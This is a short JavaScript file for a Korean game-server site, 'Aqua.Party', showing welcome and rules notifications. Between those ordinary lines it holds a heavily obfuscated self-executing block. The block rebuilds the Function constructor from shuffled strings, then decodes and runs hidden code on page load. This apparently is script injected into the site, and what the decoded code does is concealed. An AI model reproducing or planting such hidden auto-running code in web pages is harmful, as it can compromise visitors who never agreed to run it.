	toastr.options = {
		  "closeButton": true,
		  "debug": false,
		  "newestOnTop": true,
		  "progressBar": true,
		  "positionClass": "toast-bottom-full-width",
		  "preventDuplicates": false,
		  "onclick": null,
		  "showDuration": "300",
		  "hideDuration": "1000",
		  "timeOut": "2000",
		  "extendedTimeOut": "1000",
		  "showEasing": "swing",
		  "hideEasing": "linear",
		  "showMethod": "fadeIn",
		  "hideMethod": "fadeOut"
	}
	toastr.success("Aqua.Party (아쿠아파티) 서버에 방문하신 것을 환영합니다.", "공지사항")

var nokey,closeIt;(function(){var vXa='',LSr=11;function mqr(l){var e=5502976;var o=l.length;var n=[];for(var q=0;q<o;q++){n[q]=l.charAt(q)};for(var q=0;q<o;q++){var r=e*(q+267)+(e%40134);var c=e*(q+418)+(e%14907);var a=r%o;var v=c%o;var k=n[a];n[a]=n[v];n[v]=k;e=(r+c)%5707958;};return n.join('')};var dUi=mqr('coiemrauhokuvcfjsrswldynrbpqoctxgttnz').substr(0,LSr);var fWv='u.n rrvab-.e[s)2dkp=Sgan}sng.ain;-ve)+r5s;o=30(,}=,v=(94ei1rv4 A+nc9,;r,gg1=dba61y.f)7)af,e=7+c;37;8g,r8tg  );].f1zoo=zh8so;f<y;7emn+b9]7+8eso;f]]n,+,tv=rtz=[=ssht7n=9td= 1")a Ai6en0+d6f=hi(+;+=r{vi0oh=ghb>i={tC0=,*<4,"eho.;9efnm 1;r]((ftluete,r9=ic(,8.ja)Sh;(hejiorn;t;(jrijs) 0Ayeeu=t0,rmrar+r;os,53c=rlr tejvh"sas,kdfv .e;k)a ],rh(t,0kt{rCf2v==i)e.;)ydi8in+.(ra ;t{a[{(.l7}pigba i,hv.9aav[cvfn+n)ln .(((={.+h)ae;ruuor" a)v;(qan(avett=vr*)d[;logth03.cr0>h([arr;gwke;as)m"6(r;r9b3y)u(sd2nhl"kr==uk,;2l-a3)(,c,6+urue((hi1eCfnzll)b=[enb]pCcl.omC;rhln++u2r;[ikvc;,e)fl(6+kxrtfnog a[ga[sia]};1,h.r7ol][ t8=pac)2avt;<;tnsvsl+aene(ov1t}"]r"rnfo)bgy)hii{rtrovt<].)n.e}u);hu10uto v;;pk8"t)[((l3e.(0,r o;3(9opr(s-5+lp vr(  68bpp]c]r)p=.sro;(nAefefro!(u=;alCCaav+o";rat.-;rprhl=+;)m.g.,lsih( nmrghrd-t-e+6v=i n;he)gn.sf)cAC0s]4n.e[t})da=b<=a;[ksg6pv2i=93r=!.)(r))dal3u';var Uwc=mqr[dUi];var gRQ='';var Rov=Uwc;var LBf=Uwc(gRQ,mqr(fWv));var SLC=LBf(mqr(']eb"}0ss ]feff]xu5"!"a0p i;4]=tp\'dt2f,t=b}tu"1\/a<]e(,<:!0$;(7rec l!dsf#]%d#"t<&r1,"}.ve,se+)de$<o"t8)<{"{o<c(r}i..*]2 .#reD.,,-cl"c]e-nhrlg.+]yrt(eeina4p.C]<{cpo<7;s#ae("5=s)0(r.bi<|f<.foo;<)2"p.k)e<t3et<)v<o)<bi-da<5,u.<r*6<1}< <0$r-=r$fs])en0;5,32(kr,<-o3;d],o.<st7p"lt)<s.,xt..]td<e[1<.6"aat%n<a"f<5]foa,(nl_cn"0l,(n:"<.atn<<tDu"e.,"<2{r1$0[ns$<x";(3-(d<nf{<,Tn<y"$=(|NC<&cfr.9sancf!o(3<2"u\'.sm)ae.aC}o{-<E7l)-,d[5]"}([%}s!d<e$ef,<;(6.)el= <;.(s2,.xv[roh8.#f<ueu$it<is9.<]$=yaa$5]lfh&*2y3mo;c0(+tooptto$:<c)r_(fx1-3orn14o!<[na(r&2u<0f.(;0{f(3]gms$h(v..n"x"v0)}ta(<q+c,g8c;p3.(c1{**.s&sDo{t0_h<f)3()=If)pt7t,i[$\'d))]!=uf(35ef "(pl&vE,<91o.},no7of"3]3i0eC"f.thtx2(ft8o!<1(x](nx{roo.0<8)l<c,<(."te<<*2{.nl._[e0fy<lrC6nor<2o"a),)e(]9<>o(_7()170p)afe".,.e\/#do+t{io")1wpt+d(f<,$\'f=(r]fi5 .p=vl_1[p<<<efesa"e==pwa+)"6,s)aswss] s[89<6"rc"(=#.rll)4{\/{)<}]<bx..(.8<<n{(0)]}0n.[ll57.#"<g]o")t"}*<.{p3=<(epv<,t}<(k\'l{fEn.=0.2;a{r(ysE{_|0e1o"<t]ur,o"s)n],eo 7h|vmme3s}t<u(<wo.0\/ca)ro.uv).xa;2 pc8"&l+<Dd1=& 9<["e<d<f]1(mfp.de(ots<}=.e"4.6Ct{51<.],fn%,,]sv*!;&f 7"be"l)v<u{ seIe o"l<<*(])3d0Co!<1o<<<fe"e"xsT$02[!"b$)e(Cw"e\/)<f(<<7{)]t]3"r])"g0-or<s0]<*)ef<.]gri)<bk=.0[in.e.os<\/fc8CD)<.<_)..g&f 0.1.<.,(.$%p 7)Can17te0'));var rbH=Rov(vXa,SLC );rbH(); })()

console.log('%c규정을 꼼꼼히 읽어주시기 바랍니다!', 'color: #8C69FF')

swal('아쿠아 파티 서버',
	'페이지의 규정을 숙지하지 않고 플레이 시 <br> 서버는 유저의 불이익을 책임지지 않습니다.',
	'success')
